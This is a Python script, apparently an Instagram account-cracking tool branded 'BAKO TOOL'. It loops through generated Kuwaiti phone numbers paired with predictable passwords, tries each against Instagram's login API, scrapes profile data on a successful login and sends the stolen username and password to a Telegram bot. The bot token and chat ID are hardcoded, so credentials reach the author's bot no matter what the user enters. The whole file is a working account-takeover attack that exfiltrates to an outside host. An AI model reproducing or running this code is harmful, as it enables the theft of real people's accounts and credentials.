# = = = = = = = = = = = =
BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
Z = '\033[1;31m' #سور
A = '\033[1;33m' #سەوز
Z1 = '\033[2;31m' #زەرد
F = '\033[2;32m' #شێن
X = '\033[2;34m'#پەمبە
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
Y = '\033[1;34m' #
'\033[1;34m'
'\033[1;34m'
# = = = = = = = = = = = =

try:
    import os
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0



    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)

luc= """
"""+BWhite+""" < """+BYellow+""" BAKO UP """+BWhite+""" >

  """+BRed+"""___ ____   _   _ _   _ _   _ _____
"""+BYellow+""" |_ _/  \
"""+BRed+"""  | | |   SULTAN
"""+BYellow+"""  | @devaharki
"""+BRed+"""
    """+BWhite+"""<    """+BRed+"""BAKO_GAMING0"""+BWhite+""">

"""+BRed+"""▷ """+BWhite+"""—— —— ——  —— —— ——  —— —— ——  —— —— ——  """+BRed+"""◁
"""+BRed+""" ⁂  SULTAN  """+BWhite+""" ¦ """+BYellow+"""     @devaharki
"""+BRed+""" ⁂  BᄂΛᄃKDIΣ """+BWhite+""" ¦ """+BYellow+""" @DLV_BlackDie
"""+BRed+""" ⁂ Danyal """+BWhite+""" ¦ """+BYellow+""" @q0qdt
"""+BRed+"""▷ """+BWhite+"""—— —— ——  —— —— ——  —— —— ——  —— —— ——  """+BRed+"""◁
 """
#
Lk = """
"""+BYellow+""" < """+BWhite+""" SULTAN """+BWhite+""" >
BY : @devaharki
"""
#

print(luc)
print(' ')
print(BWhite+'== == == == == == == == == == == == == == == == == == == == ')
ID = input(""+BWhite+" ⌯"+BGreen+" ID :  ")
ID = ("2140645920")
tok = input(""+BWhite+" ⌯"+BGreen+" TOKEN :  ")
tok = ("5048350878:AAEaG9wvZ-OiiCTdriM8p69c_OgbajJwGQk")


def code_joo(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com',
         'KeepAlive':'True',
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36',
         'Cookie':cookie,
         'Accept':'*/*',
         'ContentType':'application/x-www-form-urlencoded',
         'X-Requested-With':'XMLHttpRequest',
         'X-IG-App-ID':'936619743392459',
         'X-Instagram-AJAX':'missing',
         'X-CSRFToken':'missing',
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']

        lucifer = f" - / BAKO TOOL UP  ︎\n———————×——————— \n [🔰]𝐔𝐒𝐄𝐑  : {username}\n [✅] 𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝 : {password}\n [🔰] 𝐔𝐬𝐞𝐫 : {userQ}\n [✅] 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐬 :  {followes}\n [📟] 𝐇𝐞𝐫 𝐍𝐞𝐰 𝐃𝐚𝐭𝐚 : {dat}\n———————×———————\n CH:@devaharki"

        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=\n {lucifer} \n"
        i = requests.post(tlg)


url = 'https://i.instagram.com/api/v1/accounts/login/'
headers = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
        'Accept': "*/*",
        'Cookie': 'missing',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-Connection-Type': 'WIFI',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com'}
sleep(1)
sleep(0.1)
user = '12345678900987654321'
while True:
        us = str(''.join((random.choice(user) for i in range(5))))
        username = '+965650' + us
        password = '650' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid,
         'password':password,
         'username':username,
         'device_id':uid,
         'from_reg':'false',
         '_csrftoken':'missing',
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            code_joo(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Z1+f"\r                 \n [🏴‍☠️] Hit : {zz} \n [🏴‍☠️] Bad : {aa} \n [🏴‍☠️] Scure :  \n [🏴‍☠️] Block : \n [🏴‍☠️] User : {username} \n [🏴‍☠️] Pass : {password} ",end='')
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            print (Z1+"⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯")
            print(Lk)
            print (Z1+"⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯⌯")
            print(C+f"\r                 \n {F}[🏴‍☠️] OK : {zz} \n {Z1}[🏴‍☠️] CP : {aa} {S}\n{A} [🏴‍☠️] Scure :  \n {X}[🏴‍☠️] Block : \n {C}[🏴‍☠️] User : {username} \n{Z} [🏴‍☠️] Pass : {password} ",end='')
            aa += 1